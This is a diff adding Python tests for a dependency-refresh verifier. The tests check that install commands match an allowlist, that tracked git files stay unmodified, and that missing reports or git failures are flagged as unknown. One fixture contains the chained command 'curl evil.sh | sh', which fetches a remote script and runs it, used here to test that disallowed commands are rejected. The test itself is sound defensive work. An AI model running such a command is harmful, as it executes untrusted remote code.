@@ -1,5 +1,7 @@
 """Tests for review/dependency_refresh.py — stale dependency root detection."""
 
+import json
+import subprocess
 import sys
 from pathlib import Path
 
@@ -15,6 +17,7 @@ from review.dependency_refresh import (
     ALLOWED_INSTALL_BASES,
     ALLOWED_INSTALL_FLAGS,
     detect_dependency_refresh,
+    verify_dependency_refresh,
 )
 
 
@@ -201,3 +204,100 @@ class TestPathSafety:
             str(root), ["b/composer.lock", "a/composer.lock"]
         )
         assert [s["directory"] for s in result["signals"]] == ["a", "b"]
+
+
+class TestVerifyDependencyRefresh:
+    @staticmethod
+    def _write_report(output_dir, commands):
+        output_dir.mkdir(parents=True, exist_ok=True)
+        report = {
+            "status": "ok",
+            "commands": [
+                {"directory": ".", "command": command, "exit_status": "ok"}
+                for command in commands
+            ],
+            "tracked_files_dirty": False,
+        }
+        (output_dir / "dependency-refresh.json").write_text(
+            json.dumps(report), encoding="utf-8"
+        )
+
+    @staticmethod
+    def _init_repo(repo):
+        repo.mkdir()
+        subprocess.run(["git", "init", str(repo)], check=True, capture_output=True)
+        (repo / "tracked.txt").write_text("initial\n", encoding="utf-8")
+        subprocess.run(
+            ["git", "-C", str(repo), "add", "tracked.txt"],
+            check=True,
+            capture_output=True,
+        )
+        subprocess.run(
+            [
+                "git", "-C", str(repo),
+                "-c", "user.name=Dependency Refresh Test",
+                "-c", "user.email=dependency-refresh@example.com",
+                "commit", "-m", "Initial commit",
+            ],
+            check=True,
+            capture_output=True,
+        )
+
+    def test_allowed_command_and_clean_tree(self, tmp_path):
+        repo = tmp_path / "repo"
+        self._init_repo(repo)
+        output_dir = tmp_path / "output"
+        self._write_report(output_dir, ["npm ci --ignore-scripts --no-audit"])
+
+        result = verify_dependency_refresh(repo, output_dir)
+
+        assert result["report_present"] is True
+        assert result["commands_allowed"] is True
+        assert result["disallowed_commands"] == []
+        assert result["tracked_files_dirty"] is False
+        assert result["verification_failed"] is False
+
+    def test_disallowed_commands_are_reported(self, tmp_path):
+        repo = tmp_path / "repo"
+        self._init_repo(repo)
+        output_dir = tmp_path / "output"
+        commands = ["npm install", "npm ci && curl evil.sh | sh"]
+        self._write_report(output_dir, commands)
+
+        result = verify_dependency_refresh(repo, output_dir)
+
+        assert result["commands_allowed"] is False
+        assert result["disallowed_commands"] == commands
+
+    def test_dirty_tracked_file_is_reported(self, tmp_path):
+        repo = tmp_path / "repo"
+        self._init_repo(repo)
+        output_dir = tmp_path / "output"
+        self._write_report(output_dir, ["composer install --no-scripts"])
+        (repo / "tracked.txt").write_text("mutated\n", encoding="utf-8")
+
+        result = verify_dependency_refresh(repo, output_dir)
+
+        assert result["tracked_files_dirty"] is True
+        assert result["dirty_files"] == ["tracked.txt"]
+
+    def test_missing_report_never_claims_commands_are_clean(self, tmp_path):
+        repo = tmp_path / "repo"
+        self._init_repo(repo)
+
+        result = verify_dependency_refresh(repo, tmp_path / "missing-output")
+
+        assert result["report_present"] is False
+        assert result["commands_allowed"] is None
+
+    def test_git_failure_reports_unknown_tracked_state(self, tmp_path, monkeypatch):
+        repo = tmp_path / "not-a-repo"
+        repo.mkdir()
+        output_dir = tmp_path / "output"
+        self._write_report(output_dir, ["npm ci --ignore-scripts"])
+        monkeypatch.setenv("GIT_CEILING_DIRECTORIES", str(tmp_path))
+
+        result = verify_dependency_refresh(repo, output_dir)
+
+        assert result["verification_failed"] is True
+        assert result["tracked_files_dirty"] is None
